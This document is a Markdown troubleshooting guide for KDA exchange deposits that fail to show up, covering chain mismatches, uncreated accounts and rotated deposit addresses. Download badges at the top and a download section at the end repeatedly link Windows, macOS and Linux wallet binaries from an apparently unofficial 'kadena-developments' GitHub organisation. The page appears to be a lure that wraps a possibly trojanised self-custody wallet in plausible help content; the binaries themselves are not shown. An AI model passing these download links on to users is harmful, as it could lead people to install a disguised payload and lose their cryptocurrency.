![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Exchange Deposit Not Showing? The Chain Mismatch Behind It</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

An exchange deposit that never arrives is usually not lost. It arrived somewhere: on a chain your wallet was not displaying, under an account that was never created, or against an address the venue generated for a different network. Each case has a different recovery, and the transaction record tells you which one you are in.

## You'll see this if

- You withdrew KDA from an exchange and the receiving wallet still shows nothing.
- You deposited KDA to an exchange and your balance there never moved.
- A deposit address looked like your usual address but was not.
- The transaction shows as successful on one page and nowhere on another.

## What actually travels in a KDA transfer

A Kadena transfer carries more than an amount and a destination. It names a chain, and the destination is an account whose existence on that chain is a separate fact from the address itself.

That produces three independent things that must line up:

| Thing | Chosen by | What happens when it is wrong |
| --- | --- | --- |
| The chain | The sender, at withdrawal time | Funds land where the receiver is not looking |
| The account | The name plus its guard | The transfer stops at the create step |
| The network | Nobody, because there is only one | Not a variable, despite what interfaces imply |

The third row matters because it is the one people suspect first and should suspect last. There is one Kadena network and one KDA token. The variable that actually breaks deposits is the chain, and it breaks them silently.

## Case one: the chain

This is the common one, by a wide margin. Your wallet opens on chain 0. The exchange withdraws on chain 2, because that is the chain it credits. The transaction succeeded, the funds exist, and your wallet is answering a question about a different chain.

**How to confirm.** Take the transaction hash from the sending side and open it in a community explorer. The explorer shows which chain included it. Then check that chain against the ones your wallet can display.

**How to recover.** Switch the wallet to that chain. The balance appears. Nothing else is required, and nothing was ever at risk.

**If the receiving side was an exchange,** the same logic runs in reverse: the venue credits one chain, and a deposit sent on another may sit uncredited until support moves it. Open a ticket with the transaction hash, the chain number, the amount and the deposit address. That is the evidence they need, and it is all on-chain.

## Case two: the account was never created

A transfer to a name that does not yet exist on the destination chain needs a create step, which means supplying the guard for that account. Wallets that automate this look identical to wallets that do not, until the transfer stalls half-finished.

**How to confirm.** The explorer shows the transaction on the source chain with an unspent or failed continuation rather than a credited destination. Balances on the destination chain are unchanged.

**How to recover.** Complete the second half from a wallet that understands cross-chain continuations, using the request key from the first half. Do not resend: the source chain has already debited, and a second send moves new funds into the same half-finished state.

## Case three: the address was not yours

Deposit addresses at exchanges are frequently per-user and sometimes rotate. A saved address from two years ago may still look right and belong to nobody.

**How to confirm.** Compare the deposit address in your withdrawal history with the one the venue shows today. If they differ, the older one may no longer be credited to your account.

**How to recover.** This is venue support, not chain recovery. Their records map addresses to accounts, and only they can apply that mapping.

## The diagnosis, in order

1. **Get the transaction hash** from the sending side, not a screenshot of a balance.
2. **Open the hash in a community explorer** and read the chain number it names.
3. **Check that chain** in the receiving wallet, stepping through chains if there is no selector.
4. **If the balance is there,** you are finished. Record the chain so the next deposit goes to the right place.
5. **If the hash does not appear at all,** the sending side did not broadcast it. That is a withdrawal problem at the venue, not a Kadena problem.
6. **If the hash appears on the source chain only,** the continuation was never submitted. That is case two.
7. **If the address differs from the current one,** open a venue ticket with the hash.

Six of those seven steps are read-only and take minutes. The temptation to re-send is the thing that turns a display problem into a real loss.

## Why "pending" is not the same as "lost"

Kadena produces blocks on all twenty chains, at roughly thirty seconds per chain on average. "Per chain" is the phrase that matters: a confirmation on one chain says nothing about a second chain's inclusion, and a cross-chain transfer is two operations with two separate confirmations.

A wallet that reports a single status for a two-part operation will sometimes show "pending" when the truth is "half done". That is a display limitation, and the explorer resolves it.

## When the venue delisted in the meantime

A deposit that lands after a venue announced a delisting can be credited to an account you can no longer trade from. The order of operations changes: confirm the funds exist on-chain first, then check whether deposits and withdrawals are still open, and only then decide whether to wait for support or to treat the balance as stranded.

The delisting date, not the deposit date, decides what the venue will do. Keep the announcement, because it is the only statement of their policy you will have.

## Prevention

- **Record the chain with the address.** A note that says only "my KDA address" will cost you an afternoon.
- **Send a small test amount** for any new route, exchange or wallet, and confirm it before the rest.
- **Withdraw to an address you generated,** not one you copied from a chat or a previous year.
- **Keep the transaction hash** until the funds are visible where you expect them.
- **Do not pay anyone who offers to "recover" a stuck deposit.** The chain record is the recovery, and it is free.

## FAQ

**The exchange says the withdrawal succeeded. Where is it?**
Open the hash in an explorer. If it is included on a chain your wallet is not showing, the funds are visible there. If it is not included at all, the venue never broadcast it.

**Can a deposit be reversed?**
No. Inclusion is final. What can be completed is a second half that was never submitted, and that is a continuation rather than a reversal.

**Why did my address change between deposits?**
Venues rotate or assign per-user addresses. Always take the address from the deposit screen rather than from history.

**Does a memo or tag apply to KDA?**
Kadena accounts are named, so there is no shared-address tagging model. If a venue asks for a memo, follow its instructions exactly, and treat a missing memo as a support case rather than a loss.

**Is a deposit safe while a delisting is announced?**
Assume nothing. Check the notice for deposit and withdrawal cut-offs before sending, and prefer a route whose channels you have confirmed that day.

## Related reading

- Cashing out KDA: every route that still has a buyer
- Choosing a chain in Kadena Wallet: why balances differ
- Cross-chain transfers in Kadena Wallet: how the twenty chains connect
- Why your KDA balance shows zero, and where it really is

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Kadena Wallet Cannot Reach the Network: What to Check](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/kadena-wallet-connection-error-fix.md)
- [What a KDA Transaction Costs, and Why a Send Fails](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/kadena-transaction-fees-explained.md)
- [Legacy Accounts and k: Addresses: Why Both Still Exist](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/legacy-account-vs-k-address-in-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
